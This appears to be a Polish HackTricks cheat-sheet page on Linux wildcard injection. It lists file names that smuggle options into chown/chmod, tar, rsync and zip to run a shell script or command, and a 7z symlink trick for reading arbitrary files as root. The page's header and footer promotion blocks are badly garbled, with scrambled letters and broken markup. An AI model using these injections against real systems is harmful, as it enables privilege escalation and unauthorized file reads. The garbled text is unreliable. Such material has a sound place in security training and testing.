{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Ucz się i praktykuj GCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>Wsparcie HackTricks</smmay>

*Sprawdź [**subsrippangithub.cm/sorsarlosp!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Dziel się trikami, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Możesz **określić, którego właściciela pliku i uprawnienia chcesz skopiować dla pozostałych plików**
```bash
touch "--reference=/my/own/path/filename"
```
Możesz to wykorzystać, używając [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(połączony atak)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Wykonaj dowolne polecenia:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Możesz to wykorzystać za pomocą [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(atak tar)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Wykonaj dowolne polecenia:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Możesz to wykorzystać za pomocą [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_atak _rsync)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

W **7z** nawet używając `--` przed `*` (zauważ, że `--` oznacza, że następujące dane wejściowe nie mogą być traktowane jako parametry, więc w tym przypadku tylko ścieżki do plików) możesz spowodować dowolny błąd w odczycie pliku, więc jeśli polecenie takie jak poniższe jest wykonywane przez roota:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
I możesz tworzyć pliki w folderze, w którym to jest wykonywane, możesz stworzyć plik `@root.txt` oraz plik `root.txt`, będący **symlinkiem** do pliku, który chcesz przeczytać:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Następnie, gdy **7z** zostanie uruchomione, potraktuje `root.txt` jako plik zawierający listę plików, które powinno skompresować (to wskazuje na istnienie `@root.txt`), a gdy 7z odczyta `root.txt`, odczyta `/file/you/want/to/read` i **ponieważ zawartość tego pliku nie jest listą plików, zgłosi błąd** pokazując zawartość.

_Więcej informacji w Write-upach z boxa CTF z HackTheBox._

## Zip

**Wykonaj dowolne polecenia:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Ucz się & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>Wsparcie HackTricks</smmay>

*Sprawdź [**subsrippangithub.cm/sorsarlosp!
* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Dołącz 💬 [**grupę Discord**](https://discord.gg/hRep4RUj7f) lub [**grupę telegramową**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
